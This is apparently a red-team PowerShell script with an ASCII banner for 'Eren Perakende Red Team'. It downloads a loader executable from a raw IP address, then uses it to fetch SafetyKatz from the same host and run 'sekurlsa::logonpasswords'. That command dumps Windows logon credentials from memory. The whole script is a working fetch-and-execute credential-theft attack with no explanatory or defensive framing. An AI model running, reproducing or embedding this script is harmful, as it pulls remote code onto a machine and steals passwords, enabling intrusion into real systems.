Clear-Host
Write-Host ""
Write-Host ""
Write-Host -Fore Red 
"
                                                                                                         
@@@@@@@@@@    @@@@@@    @@@@@@@   @@@@@@   @@@@@@@    @@@@@@   @@@  @@@       @@@@@@@    @@@@@@     @@@  
@@@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@       @@@@@@@@  @@@@@@@    @@@@  
@@! @@! @@!  @@!  @@@  !@@       @@!  @@@  @@!  @@@  @@!  @@@  @@!@!@@@       @@!  @@@  !@@       @@@!!  
!@! !@! !@!  !@!  @!@  !@!       !@!  @!@  !@!  @!@  !@!  @!@  !@!!@!@!       !@!  @!@  !@!         !@!  
@!! !!@ @!@  @!@!@!@!  !@!       @!@!@!@!  @!@!!@!   @!@  !@!  @!@ !!@!       @!@@!@!   !!@@!!      @!@  
!@!   ! !@!  !!!@!!!!  !!!       !!!@!!!!  !!@!@!    !@!  !!!  !@!  !!!       !!@!!!     !!@!!!     !@!  
!!:     !!:  !!:  !!!  :!!       !!:  !!!  !!: :!!   !!:  !!!  !!:  !!!       !!:            !:!    !!:  
:!:     :!:  :!:  !:!  :!:       :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  :!:  :!:           !:!     :!:  
:::     ::   ::   :::   ::: :::  ::   :::  ::   :::  ::::: ::   ::   ::  :::   ::       :::: ::     :::  
 :      :     :   : :   :: :: :   :   : :   :   : :   : :  :   ::    :   :::   :        :: : :       ::  
                                                                                                         " 
Write-Host -Fore Red "          Eren Perakende Red Team" 
Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
Write-Host ""
Write-Host ""

if (-not (Test-Path "C:\eren")) {
    New-Item -Path "C:\eren" -ItemType Directory -Force
}

if (-not (Test-Path "C:\eren\Loader.exe")) {
    Start-BitsTransfer -Source "http://78.129.240.79:8080/Loader.exe" -Destination "C:\eren\Loader.exe"
}

$exePath = "C:\eren\Loader.exe"
$url = "http://78.129.240.79:8080/SafetyKatz.exe"
& $exePath -path $url -Args sekurlsa::logonpasswords